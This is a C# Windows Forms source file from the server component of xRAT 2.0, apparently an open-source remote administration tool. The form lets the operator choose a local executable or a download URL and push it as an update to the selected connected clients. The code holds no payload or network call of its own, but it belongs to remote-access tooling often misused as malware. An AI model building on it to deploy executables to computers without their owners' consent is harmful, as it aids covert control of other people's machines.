using System;
using System.IO;
using System.Windows.Forms;

namespace xServer.Forms
{
    public partial class FrmUpdate : Form
    {
        private readonly int _selectedClients;

        public FrmUpdate(int selected)
        {
            _selectedClients = selected;
            InitializeComponent();
        }

        private void FrmUpdate_Load(object sender, EventArgs e)
        {
            this.Text = string.Format("xRAT 2.0 - Update [Selected: {0}]", _selectedClients);
            if (Core.Misc.Update.UseDownload)
                radioURL.Checked = true;
            txtPath.Text = File.Exists(Core.Misc.Update.UploadPath) ? Core.Misc.Update.UploadPath : string.Empty;
            txtURL.Text = Core.Misc.Update.DownloadURL;
            btnUpdate.Text = "Update Client" + ((_selectedClients > 1) ? "s" : string.Empty);
        }

        private void btnUpdate_Click(object sender, EventArgs e)
        {
            Core.Misc.Update.UseDownload = radioURL.Checked;
            Core.Misc.Update.UploadPath = File.Exists(txtPath.Text) ? txtPath.Text : string.Empty;
            Core.Misc.Update.DownloadURL = txtURL.Text;

            this.DialogResult = DialogResult.OK;
            this.Close();
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Multiselect = false;
                ofd.Filter = "Executable (*.exe)|*.exe";
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtPath.Text = Path.Combine(ofd.InitialDirectory, ofd.FileName);
                }
            }
        }

        private void radioLocalFile_CheckedChanged(object sender, EventArgs e)
        {
            groupLocalFile.Enabled = radioLocalFile.Checked;
            groupURL.Enabled = !radioLocalFile.Checked;
        }

        private void radioURL_CheckedChanged(object sender, EventArgs e)
        {
            groupLocalFile.Enabled = !radioURL.Checked;
            groupURL.Enabled = radioURL.Checked;
        }

    }
}